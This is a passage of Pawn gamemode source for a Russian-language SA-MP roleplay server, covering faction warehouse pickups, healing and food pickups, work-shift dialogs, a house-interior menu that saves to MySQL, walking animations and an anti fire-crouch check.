	    if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,63,DIALOG_STYLE_LIST,"Выберете оружие","{FFFFFF}Silenced 9mm\nDesert Eagle\nShotgun\nAK-47\nM4\nMP5\nДубинка\nБронижелет\nПоложить материалы","Далее","Назад");

	}
	if(pickupid == gunpic[0] || pickupid == gunpic[2] || pickupid == gunpic[3])
	{
	    if(GetPlayerVirtualWorld(playerid) != PlayerInfo[playerid][pMember]) return true;
	    if(PlayerInfo[playerid][pWork] == 0) return SendClientMessage(playerid,CGREY,"Начните рабочий день на базе организации");
   		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			static const fmt_string[] = "[R] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			if(PlayerInfo [playerid][pMember] == F_LVPD) SetMatsInt("lvpdmats",FracMats[PlayerInfo[playerid][pMember]]);
   			else if(PlayerInfo [playerid][pMember] == F_LSPD) SetMatsInt("lspdmats",FracMats[PlayerInfo[playerid][pMember]]);
   			else if(PlayerInfo[playerid][pMember] == F_ARMY)
   			{
   			    SetMatsInt("armysamats",FracMats[PlayerInfo[playerid][pMember]]);
   			    UpdateArmy();
   			}
			return true;
		}
  		if(!PlayerInfo[playerid][pLic][L_GUN]) return SendClientMessage(playerid,CGREY,"У Вас нет лицензии на оружие");
	    if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,63,DIALOG_STYLE_LIST,"Выберете оружие","{FFFFFF}Silenced 9mm\nDesert Eagle\nShotgun\nAK-47\nM4\nMP5\nДубинка\nБронижелет\nПоложить материалы","Далее","Назад");
	    
	}

	if(pickupid == FracPic[F_RIFA-6])
	{
	    if(PlayerInfo[playerid][pMember] != F_RIFA) return true;
		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			SetMatsInt("grovemats",FracMats[PlayerInfo[playerid][pMember]]);
			static const fmt_string[] = "[F] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			UpdateMat(PlayerInfo[playerid][pMember]);
			return true;
		}
		if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
	}
	if(pickupid == FracPic[F_GROVE-6])
	{
	    if(PlayerInfo[playerid][pMember] != F_GROVE) return true;
		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			SetMatsInt("grovemats",FracMats[PlayerInfo[playerid][pMember]]);
			static const fmt_string[] = "[F] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			UpdateMat(PlayerInfo[playerid][pMember]);
			return true;
		}
		if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
	}
	if(pickupid == FracPic[F_BALLAS-6])
	{
	    if(PlayerInfo[playerid][pMember] != F_BALLAS) return true;
   		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			SetMatsInt("ballasmats",FracMats[PlayerInfo[playerid][pMember]]);
			static const fmt_string[] = "[F] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			UpdateMat(PlayerInfo[playerid][pMember]);
			return true;
		}
		if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
	}
	if(pickupid == FracPic[F_AZTECAS-6])
	{
	    if(PlayerInfo[playerid][pMember] != F_AZTECAS) return true;
   		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			SetMatsInt("aztecasmats",FracMats[PlayerInfo[playerid][pMember]]);
			static const fmt_string[] = "[F] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			UpdateMat(PlayerInfo[playerid][pMember]);
			return true;
		}
		if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
	}
	if(pickupid == FracPic[F_VAGOS-6])
	{
	    if(PlayerInfo[playerid][pMember] != F_VAGOS) return true;
	    
   		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			SetMatsInt("vagosmats",FracMats[PlayerInfo[playerid][pMember]]);
			static const fmt_string[] = "[F] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			UpdateMat(PlayerInfo[playerid][pMember]);
			return true;
		}
		if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
	}
	if(pickupid == FracPic[F_BIKERS-6])
	{
	    if(PlayerInfo[playerid][pMember] != F_BIKERS) return true;
	    
   		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			SetMatsInt("bikersmats",FracMats[PlayerInfo[playerid][pMember]]);
			static const fmt_string[] = "[F] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			UpdateMat(PlayerInfo[playerid][pMember]);
			return true;
		}
		if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
	}
	if(pickupid == FracPic[F_LCN-6])
	{
	    if(PlayerInfo[playerid][pMember] != F_LCN) return true;
	    
   		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			SetMatsInt("lcnmats",FracMats[PlayerInfo[playerid][pMember]]);
			static const fmt_string[] = "[F] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			UpdateMat(PlayerInfo[playerid][pMember]);
			return true;
			
		}
		if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
	}
	if(pickupid == FracPic[F_YAKUZA-6])
	{
	    if(PlayerInfo[playerid][pMember] != F_YAKUZA) return true;
	    
   		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			SetMatsInt("triadmats",FracMats[PlayerInfo[playerid][pMember]]);
			static const fmt_string[] = "[F] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			UpdateMat(PlayerInfo[playerid][pMember]);
			return true;
		}
		if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
	}
	if(pickupid == FracPic[F_RM-6])
	{
	    if(PlayerInfo[playerid][pMember] != F_RM) return true;
	    
   		if(GetPVarInt(playerid,"AmmoVR") > 0)
		{
			DeletePVar(playerid,"AmmoVR");
			SetPlayerSpecialAction(playerid,0);
			if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
			ApplyAnimation(playerid, "CARRY", "PUTDWN", 4.1, 0, 0, 0, 0, 0,1);
			SendClientMessage(playerid,CREWARD,"Вы положили материалы на склад");
			FracMats[PlayerInfo[playerid][pMember]] += 250;
   			SetMatsInt("rmmats",FracMats[PlayerInfo[playerid][pMember]]);
			static const fmt_string[] = "[F] %s положил 250 материалов на склад. На складе: %i материалов";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],FracMats[PlayerInfo[playerid][pMember]]);
			SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,str);
			UpdateMat(PlayerInfo[playerid][pMember]);
			return true;
		}
		if(FracLock[PlayerInfo[playerid][pMember]] == 1) return SendClientMessage(playerid,CGREY,"Склад закрыт");
	    ShowPlayerDialog(playerid,38,DIALOG_STYLE_LIST,"Общак","1 |  Взять\n2 | Положить","Выбрать","Отмена");
	}
	if(pickupid == healpic[2])
	{
		if(PlayerInfo[playerid][pGolod] < 100)
		{
	 		if(PlayerInfo[playerid][pNHeal] == 0) return true;
	  		static const fmt_string[] = "%s съел кусочек пиццы";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+64];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
			SetPlayerChatBubble(playerid, "съел кусочек пиццы", COLOR_PURPLE, 30.0, 7000);
			ApplyAnimation(playerid,"VENDING","VEND_EAT1_P",4.1,0,1,1,1,1,1);
			SetGolod(playerid,100);
		}
		else SendClientMessage(playerid,CGREY,"Вы не голодны");
		return true;
	}
	if(pickupid == healpic[0] || pickupid == healpic[1])
	{
 		new Float:hl;
		GetPlayerHealth(playerid,hl);
		if(hl < 100)
		{
	 		if(PlayerInfo[playerid][pJailTime] == 0) return true;
	  		static const fmt_string[] = "%s съел кусочек пиццы";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+64];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername]);
			ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
			SetPlayerChatBubble(playerid, "съел кусочек пиццы", COLOR_PURPLE, 30.0, 7000);
			ApplyAnimation(playerid,"VENDING","VEND_EAT1_P",4.1,0,1,1,1,1,1);
			SetHealth(playerid,100);
			SetGolod(playerid,100);
		}
		else SendClientMessage(playerid,CGREY,"Вы здоровы");
		return true;
	}
	if(pickupid >= WorkPic[0] && pickupid <= WorkPic[8])
	{
	    if(pickupid == WorkPic[8] || pickupid == WorkPic[2])
	    {
	        if(GetPVarInt(playerid,"GrabQuest") == 3)
		    {
		        DeletePVar(playerid,"GrabQuestW");
				DeletePVar(playerid,"GrabQuest");
				SendClientMessage(playerid,CREWARD,"Вы выполнили задание!");
				PlayerInfo[playerid][pGrabQuest]++;
				BankGrab[PlayerInfo[playerid][pGrabTeam]][bQuest][3] = 2;
		    }
	    }
		if(!IsAGos(playerid)) return SendClientMessage(playerid,CGREY,"Вы не состоите в этой организации");
		else if(pickupid == WorkPic[0] && PlayerInfo[playerid][pMember] != F_MAYOR) return SendClientMessage(playerid,CGREY,"Вы не состоите в этой организации");
		else if(pickupid == WorkPic[1] && PlayerInfo[playerid][pMember] != F_HOSPITAL_LS) return SendClientMessage(playerid,CGREY,"Вы не состоите в этой организации");
	    else if((pickupid == WorkPic[2] || pickupid == WorkPic[6] || pickupid == WorkPic[7]) && PlayerInfo[playerid][pMember] != F_LVPD) return SendClientMessage(playerid,CGREY,"Вы не состоите в этой организации");
	    else if(pickupid == WorkPic[3] && PlayerInfo[playerid][pMember] != F_LIC) return SendClientMessage(playerid,CGREY,"Вы не состоите в этой организации");
	    else if(pickupid == WorkPic[4] && PlayerInfo[playerid][pMember] != F_NEWS) return SendClientMessage(playerid,CGREY,"Вы не состоите в этой организации");
	    else if(pickupid == WorkPic[5] && PlayerInfo[playerid][pMember] != F_ARMY) return SendClientMessage(playerid,CGREY,"Вы не состоите в этой организации");
	    else if(pickupid == WorkPic[8] && PlayerInfo[playerid][pMember] != F_LSPD) return SendClientMessage(playerid,CGREY,"Вы не состоите в этой организации");
	    else if(pickupid == WorkPic[9] && PlayerInfo[playerid][pMember] != F_FBI) return SendClientMessage(playerid,CGREY,"Вы не состоите в этой организации");
		if(PlayerInfo[playerid][pWork] == 0) return ShowPlayerDialog(playerid, 19, DIALOG_STYLE_MSGBOX, "Рабочий день", "{FFFFFF}Желаете переодеться и начать рабочий день?","Да","Нет");
		else return ShowPlayerDialog(playerid, 19, DIALOG_STYLE_MSGBOX, "Рабочий день", "{FFFFFF}Желаете переодеться и закончить рабочий день?","Да","Нет");
	}
	for(new i = 1; i <= TOTALBIZ; i++)
	{
		if(pickupid != BIZPIC[i]) continue;
        GameTextForPlayer(playerid,"PRESS ~r~LALT",3000,5);
		SetPVarInt(playerid,"BizP",i);
	}
	for(new i = 0; i <= 3; i++)
	{
		if(pickupid == hotelpic[i] || pickupid == pickuplift[i])
		{
			switch(BizInfo[GetPVarInt(playerid,"PBIZ")][bType])
			{
				case 12: ShowPlayerDialog(playerid,369,DIALOG_STYLE_LIST,"Лифт","Парковка\nХолл\nКомната","Далее","Назад");
				case 13: ShowPlayerDialog(playerid,187,DIALOG_STYLE_LIST,"Лифт","Парковка\nХолл\n1 этаж\n2 этаж","Далее","Назад");
			}
		}
 	}
	for(new i = 0; i <= 3; i++)
	{
		if(pickupid == hotelpic1[i])
		{
			ShowPlayerDialog(playerid,187,DIALOG_STYLE_LIST,"Лифт","Парковка\nХолл\n1 этаж\n2 этаж","Далее","Назад");
		}
	}
	return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
	if(GetPVarInt(playerid,"STO") == 0) RemoveVehicleComponent(vehicleid,componentid);
	return 1;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{

	return 1;
}

public OnPlayerSelectedMenuRow(playerid, row)
{
    if(GetPlayerMenu(playerid) == Inta)
    {
        switch(row)
        {
            case 0:
            {
	            SetPVarInt(playerid,"INTA",GetPVarInt(playerid,"INTA")+1);
	            if(GetPVarInt(playerid,"INTA") > sizeof(spawns_home)) SetPVarInt(playerid,"INTA",0);
	            SetPlayerPos(playerid, spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][0], spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][1], spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][2]);
				SetPlayerInterior(playerid, spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_INT]);
				ShowMenuForPlayer(Inta,playerid);
			}
			case 1:
			{
	            SetPVarInt(playerid,"INTA",GetPVarInt(playerid,"INTA")-1);
	            if(GetPVarInt(playerid,"INTA") < 0) SetPVarInt(playerid,"INTA",0);
	            SetPlayerPos(playerid, spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][0], spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][1], spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][2]);
				SetPlayerInterior(playerid, spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_INT]);
				ShowMenuForPlayer(Inta,playerid);
			}
			case 2:
			{
			    if(GetPVarInt(playerid,"ChangeInt"))
			    {
			        HInfo[GetPVarInt(playerid,"PHOUSE")][hXX] = spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][0];
					HInfo[GetPVarInt(playerid,"PHOUSE")][hYY]= spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][1];
					HInfo[GetPVarInt(playerid,"PHOUSE")][hZZ]= spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][2];
					HInfo[GetPVarInt(playerid,"PHOUSE")][hInt] = spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_INT];
					query = "";
					format(query, sizeof(query), "UPDATE testhouse SET hExitx ='%f',hExity ='%f',hExitz ='%f',hInt = %d WHERE id = '%d' LIMIT 1",spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][0],spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][1],
					spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][2],spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_INT],GetPVarInt(playerid,"PHOUSE"));
					mysql_tquery(mysql,query);
			        SetPlayerPos(playerid,HInfo[GetPVarInt(playerid,"PHOUSE")][hX],HInfo[GetPVarInt(playerid,"PHOUSE")][hY],HInfo[GetPVarInt(playerid,"PHOUSE")][hZ]);
					SetPlayerInterior(playerid,0);
					SetPlayerVirtualWorld(playerid,0);
					DeletePVar(playerid,"PHOUSE");
					DeletePVar(playerid,"ChangeInt");
			    }
			    else
			    {
					TOTALHOUSE++;
					sscanf(housez,"p<,>fffsi",
					HInfo[TOTALHOUSE][hX],HInfo[TOTALHOUSE][hY],HInfo[TOTALHOUSE][hZ],
					HInfo[TOTALHOUSE][hClass],HInfo[TOTALHOUSE][hCost]);
					HInfo[TOTALHOUSE][hXX] = spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][0];
					HInfo[TOTALHOUSE][hYY]= spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][1];
					HInfo[TOTALHOUSE][hZZ]= spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_COORD][2];
					HInfo[TOTALHOUSE][hInt] = spawns_home[GetPVarInt(playerid,"INTA")][SPAWNS_INT];
					HInfo[TOTALHOUSE][hVirt] = TOTALHOUSE;
					strmid(HInfo[TOTALHOUSE][hOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
					query = "";
					HInfo[TOTALHOUSE][hPick] = CreateDynamicPickup(1273,23,HInfo[TOTALHOUSE][hX],HInfo[TOTALHOUSE][hY],HInfo[TOTALHOUSE][hZ],0);
					format(query,512,"INSERT INTO testhouse (id,hEntrx,hEntry,hEntrz,hExitx,hExity,hExitz,hDiscript,hPrice,hInt,hVirtual)\
					VALUES (%d,'%f','%f','%f','%f','%f','%f','%s',%d,%d,%d)",
					TOTALHOUSE,
					HInfo[TOTALHOUSE][hX],HInfo[TOTALHOUSE][hY],HInfo[TOTALHOUSE][hZ],
					HInfo[TOTALHOUSE][hXX],HInfo[TOTALHOUSE][hYY],HInfo[TOTALHOUSE][hZZ],
					HInfo[TOTALHOUSE][hClass],HInfo[TOTALHOUSE][hCost],HInfo[TOTALHOUSE][hInt],HInfo[TOTALHOUSE][hVirt]);
					mysql_tquery(mysql,query);
					SetPlayerPos(playerid,HInfo[TOTALHOUSE][hX],HInfo[TOTALHOUSE][hY],HInfo[TOTALHOUSE][hZ]);
					SetPlayerInterior(playerid,0);
				}
			}
       	}
    }
    /*if(GetPlayerMenu(playerid) == SPpanel)
	{
	    new specid[3];
		format(specid, sizeof(specid), "%i", GetPVarInt(playerid,"SpecID"));
	    switch(row)
        {
  	   		case 0:
			{
				cmd_sp(playerid,specid);
				ShowMenuForPlayer(SPpanel,playerid);
			}
			case 1:
			{
				cmd_stats(playerid,specid);
				ShowMenuForPlayer(SPpanel,playerid);
			}
			case 2:
			{
				ShowPlayerDialog(playerid, 150, DIALOG_STYLE_INPUT, "Kick", "{FFFFFF}Введите причину кика", "Далее","Отмена");
				ShowMenuForPlayer(SPpanel,playerid);
			}
	    	case 3:
			{
				ShowPlayerDialog(playerid, 151, DIALOG_STYLE_INPUT, "Ban", "{FFFFFF}Введите время бана, причину.\nПример: 15,Читы", "Далее","Отмена");
				ShowMenuForPlayer(SPpanel,playerid);
			}
	   		case 4:
			{
			    if(PlayerInfo[GetPVarInt(playerid,"SpecID")][pJailTime]) cmd_unjail(playerid,specid);
				ShowPlayerDialog(playerid, 152, DIALOG_STYLE_INPUT, "Jail", "{FFFFFF}Введите время, причину.\nПример: 10,SK", "Далее","Отмена");
				ShowMenuForPlayer(SPpanel,playerid);
			}
	   		case 5:
			{
			    if(PlayerInfo[GetPVarInt(playerid,"SpecID")][pMuted]) cmd_unmute(playerid,specid);
				ShowPlayerDialog(playerid, 153, DIALOG_STYLE_INPUT, "Mute", "{FFFFFF}Введите время мута, причину.\nПример: 100,Оск", "Далее","Отмена");
				ShowMenuForPlayer(SPpanel,playerid);
			}
	   		case 6:
			{
				cmd_gm(playerid,specid);
				ShowMenuForPlayer(SPpanel,playerid);
			}
	   		case 7:
			{
				cmd_slap(playerid,specid);
				ShowMenuForPlayer(SPpanel,playerid);
			}
	   		case 8: cmd_spoff(playerid,"");
		}
	}*/

	return 1;
}

public OnPlayerExitedMenu(playerid)
{
	return 1;
}


stock PlayerChangeImage(playerid, bool:type)
{
    if(type)
    {
        PlayerImageID[playerid][2] = PlayerImageID[playerid][1];
        PlayerTextDrawSetString(playerid, LRArrows[playerid][2], SelectedImage[PlayerImageID[playerid][2]]);
        PlayerTextDrawShow(playerid,LRArrows[playerid][2]);
    }
    PlayerImageID[playerid][1] = PlayerImageID[playerid][0];
    PlayerTextDrawSetString(playerid, LRArrows[playerid][1], SelectedImage[PlayerImageID[playerid][1]]);
    PlayerTextDrawShow(playerid,LRArrows[playerid][1]);

    new randomImage = random(sizeof(SelectedImage));
    PlayerTextDrawSetString(playerid, LRArrows[playerid][0], SelectedImage[randomImage]);
    PlayerTextDrawShow(playerid,LRArrows[playerid][0]);
    PlayerImageID[playerid][0] = randomImage;
    return 1;
}
stock GivePoint(playerid,kolvo[])
{
	new str[7];
	format(str,sizeof(str),"~r~%s",kolvo);
    PlayerTextDrawSetString(playerid, PointsTD[playerid][1], str);
    PlayerTextDrawShow(playerid,PointsTD[playerid][1]);
    return SetTimerEx("CloseP",3000,false,"i",playerid);
}



function AnimationWalk(playerid)
{
    if(!PlayerInfo[playerid][pHod]) return true;
	new keys, updown, leftright;
	GetPlayerKeys(playerid,keys,updown,leftright);
	if((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
	{
		if(GetPVarInt(playerid,"AnimationWalk"))
		{
			KillTimer(GetPVarInt(playerid,"AnimationWalk"));
      		DeletePVar(playerid,"AnimationWalk");
  		}
	    ApplyAnimation(playerid,"PED",Anims[PlayerInfo[playerid][pHod]][aNameWalk],4.1,1,1,1,1,1);
		SetPVarInt(playerid,"AnimationWalk",_:SetTimerEx("AnimationWalk", 200, 0, "i", playerid));
	}
	else
	{
		ApplyAnimation(playerid,"PED", Anims[PlayerInfo[playerid][pHod]][aNameWalk],4.0,0,0,0,0,1);
		if(GetPVarInt(playerid,"AnimationWalk"))
		{
			KillTimer(GetPVarInt(playerid,"AnimationWalk"));
			DeletePVar(playerid,"AnimationWalk");
  		}
	}
	return true;
}



stock ClearBandQ(playerid)
{
	new i = GetPVarInt(playerid,"GrabQuest");
	BankGrab[PlayerInfo[playerid][pGrabTeam]][bQuest][i] = 0;
	DeletePVar(playerid,"GrabQuest");
	DeletePVar(playerid,"GrabQuestW");
	return 1;
}



forward CloseP(playerid);
public CloseP(playerid) return PlayerTextDrawHide(playerid,PointsTD[playerid][1]);
public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
    switch (GetPlayerWeapon (playerid))
	{
	    case 24, 25, 27, 29, 30, 31, 33, 34:
	    {
	        if(((oldkeys & KEY_FIRE)||(oldkeys == KEY_FIRE))&&((newkeys & KEY_CROUCH)||(newkeys == KEY_CROUCH)))
	        {
	            if(!GetPVarInt(playerid,"AntiC"))
	            {
	                ApplyAnimation(playerid,"PED","getup_front",4.0,0,0,1,0,0);
	                ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Anti +C","{ffffff}Предупреждение! +C запрещено!","Далее","");
			        SetPlayerArmedWeapon(playerid, 0);
			        ApplyAnimation(playerid,"FAT","IDLE_tired",4.1,0,0,0,0,0,1);
		        }
	        }
	    }
	}

	if(newkeys & KEY_FIRE)
	{
	    if(GetPVarInt(playerid,"GrabQuest") == 2)
		{
			if(GetPlayerWeapon(playerid) == 43)
			{
                new Float:x,Float:y,Float:z;
                new band = PlayerInfo[playerid][pGrabTeam];
